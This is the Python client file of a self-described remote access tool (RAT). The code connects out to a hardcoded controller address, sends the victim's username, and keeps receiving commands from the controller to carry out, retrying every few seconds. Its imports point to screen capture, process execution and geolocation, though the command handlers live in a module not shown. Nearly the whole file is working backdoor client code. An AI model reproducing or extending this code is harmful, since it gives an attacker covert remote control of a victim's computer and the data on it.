"""
client.py
version = 0.002
Remote Access Tool
Made by Lukas Alstrup
github.com/LukasAlstrup/rat

"""
import os
import socket
import pyautogui
import time
import getpass
import requests
import subprocess
import geocoder
import ctypes
import sys
from functions import *
import signal
import struct

port = 8080
host = "192.168.0.14"

print("[+] Server: ", host, " Port: ", port)


def connect():
    s = socket.socket()
    while True:
        print("Trying to connect to the server")
        try:
            s.connect((host, port))
            print("Connected to the server successfully")
            execute_commands(s)
        except ConnectionRefusedError:
            print("[-] The server refused to conect. A firewall may be blocking the port")
        except TimeoutError:
            print("[-] No response from the server")
        except Exception as e:
            print("[-] Error while connecting to the server: ", e)
        time.sleep(5)

def execute_commands(s):
    s.send(getpass.getuser().encode())
    while True:
        try:
            command = s.recv(1024)
            command = command.decode()
            check_command(s,command)
        except socket.error as socket_error:
            print("Socket error: " + socket_error)
            s.close()
            s = ""
            connect()
        except Exception as error_msg:
            print("Error: " + str(error_msg))

def main():
    connect()

main()